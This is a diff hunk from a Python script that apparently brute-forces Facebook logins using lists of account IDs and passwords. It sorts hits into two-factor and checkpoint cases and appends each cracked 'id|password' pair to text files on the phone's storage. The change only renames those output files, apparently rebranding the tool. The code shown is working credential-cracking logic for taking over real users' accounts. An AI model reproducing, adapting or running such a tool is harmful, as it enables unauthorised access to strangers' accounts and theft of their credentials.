@@ -539,18 +539,18 @@ def M_file_1(ids,names,passlist):
                                 elif twf in str(po):
                                         if 'y' in pcp:
                                                 print('\r\r\033[1;34m<[𝐃𝒂𝒓𝒌-2F]> '+ids+' | '+pas)
-                                                open('/sdcard/𝐃𝒂𝒓𝒌-2F.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/zar-2F.txt','a').write(ids+'|'+pas+'\n')
                                                 twf.append(ids)
                                                 break
               
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
                                                 print('\r\x1b[38;5;246m<[achraf[ach> ' + ids + ' | ' + pas + '\x1b[1;97m')
-                                                open('/sdcard/achraf -CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/zar -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/𝐃𝒂𝒓𝒌-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/Zar-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
